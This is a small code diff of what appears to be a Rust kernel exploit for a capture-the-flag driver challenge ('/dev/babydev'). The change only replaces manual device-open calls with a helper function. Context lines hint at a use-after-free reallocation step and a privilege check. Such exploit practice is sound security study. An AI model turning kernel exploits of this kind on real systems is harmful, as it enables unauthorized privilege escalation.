@@ -1,5 +1,3 @@
-use std::fs::OpenOptions;
-
 use kpwn::all::*;
 
 #[repr(C)]
@@ -21,16 +19,8 @@ fn main() {
 
     whoami();
 
-    let dev = OpenOptions::new()
-        .read(true)
-        .write(true)
-        .open("/dev/babydev")
-        .unwrap();
-    let dev2 = OpenOptions::new()
-        .read(true)
-        .write(true)
-        .open("/dev/babydev")
-        .unwrap();
+    let dev = open_dev("/dev/babydev").unwrap();
+    let dev2 = open_dev("/dev/babydev").unwrap();
 
     // Trigger realloc
     unsafe {
